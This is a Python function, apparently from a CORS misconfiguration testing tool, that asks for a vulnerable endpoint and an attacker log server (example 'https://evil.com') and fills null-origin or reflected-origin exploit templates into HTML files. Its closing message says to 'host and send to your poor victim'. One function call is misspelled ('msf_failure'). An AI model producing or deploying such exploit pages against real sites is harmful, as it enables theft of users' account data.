from typing import List, Dict, Optional, Tuple
import os
from colorama import Fore
from utils.helpers import msg_success, msg_warning, msg_failure

def generate_poc_interactive(target):
    print(Fore.MAGENTA+"\n[?] Do you want to generate a PoC?")
    print("1 - Null Origin")
    print("2 - Reflected Origin")
    print("0 - Exit"+Fore.WHITE)

    choice = input(">> ").strip()
    if choice not in ['1', '2']:
        msg_warning("No PoC type selected – exiting...")
        return

    endpoint = input(Fore.MAGENTA+"[?] Enter the vulnerable endpoint (e.g., /accountDetails): "+Fore.WHITE).strip()
    if not endpoint.startswith('/'):
        endpoint = '/'+ endpoint
    log_server = input(Fore.MAGENTA+"[?] Enter your exploit server domain (e.g., https://evil.com): "+Fore.WHITE).strip()

    template_file = "poc_templates/null_poc.html" if choice == '1' else "poc_templates/reflect_poc.html"
    poc_type = "null_origin" if choice == '1' else "reflected_origin"

    try:
        with open(template_file, 'r') as f:
            template = f.read()
    except FileNotFoundError:
        msf_failure(f"Template file not found: {template_file}")
        return

    # Replace placeholders
    final_html = template.replace("{URL}", target)
    final_html = final_html.replace("{ENDPOINT}", endpoint)
    final_html = final_html.replace("{LOG_SERVER}", log_server.rstrip('/'))

    # Save PoC file
    safe_endpoint = endpoint.strip("/").replace("/", "_")
    output_path = f"poc_{poc_type}_{safe_endpoint}.html"
    with open(output_path, 'w') as f:
        f.write(final_html)

    msg_success(f"[+] PoC file successfully created: {output_path}. Just host and send to your poor victim")
